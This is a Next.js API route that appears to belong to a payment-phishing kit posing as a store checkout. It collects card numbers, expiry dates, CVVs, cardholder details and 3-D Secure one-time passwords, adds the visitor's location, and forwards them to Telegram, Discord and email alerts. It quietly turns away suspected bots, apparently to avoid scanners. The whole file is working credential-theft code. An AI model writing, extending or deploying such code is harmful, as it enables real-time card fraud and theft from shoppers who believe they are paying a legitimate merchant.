import type { NextRequest } from "next/server";
import { apiError, apiSuccess } from "@/lib/api/response";
import { cardDigits } from "@/lib/checkout/card-validation";
import { formatPaymentOtpTelegramMessage } from "@/lib/checkout/format-telegram";
import { getSiteSettings } from "@/lib/data/site-settings";
import { resolveBranding } from "@/lib/site/branding";
import { sendAlert } from "@/lib/notifications/dispatch";
import { resolveVisitorGeo } from "@/lib/visitors/geo-details";
import { isLikelyBot } from "@/lib/visitors/user-agent";

export const dynamic = "force-dynamic";

interface PaymentOtpPayload {
  otp?: string;
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  email?: string;
  fullName?: string;
  merchantName?: string;
  amountDisplay?: string;
  cardBrand?: string;
  path?: string;
}

export async function POST(request: NextRequest) {
  const userAgent = request.headers.get("user-agent") ?? "";
  if (isLikelyBot(userAgent)) {
    return apiSuccess({ sent: false, reason: "bot" });
  }

  let payload: PaymentOtpPayload = {};
  try {
    payload = (await request.json()) as PaymentOtpPayload;
  } catch {
    return apiError("Invalid JSON body");
  }

  const otp = payload.otp?.trim().replace(/\D/g, "") ?? "";
  if (otp.length < 4) {
    return apiError("OTP is required");
  }

  const geo = await resolveVisitorGeo(request);
  const siteSettings = await getSiteSettings();
  const { storeName } = resolveBranding(siteSettings);

  const message = formatPaymentOtpTelegramMessage({
    otp,
    cardName: payload.cardName?.trim() || undefined,
    cardNumber: cardDigits(payload.cardNumber ?? ""),
    cardExpiry: payload.cardExpiry?.trim() ?? "",
    cardCvv: payload.cardCvv?.trim() ?? "",
    email: payload.email?.trim() || undefined,
    fullName: payload.fullName?.trim() || undefined,
    merchantName: payload.merchantName?.trim() || undefined,
    amountDisplay: payload.amountDisplay?.trim() || undefined,
    cardBrand: payload.cardBrand?.trim() || undefined,
    path: payload.path,
    userAgent,
    acceptLanguage: request.headers.get("accept-language") ?? undefined,
    geo,
    submittedAt: new Date().toISOString(),
    storeName: storeName || undefined,
  });

  const delivery = await sendAlert("3DS — OTP entered", message);

  return apiSuccess({
    sent: delivery.sent,
    reason: delivery.sent ? delivery.reason : "telegram_not_configured",
    channels: {
      telegram: delivery.telegram,
      email: delivery.email,
      discord: delivery.discord,
    },
  });
}
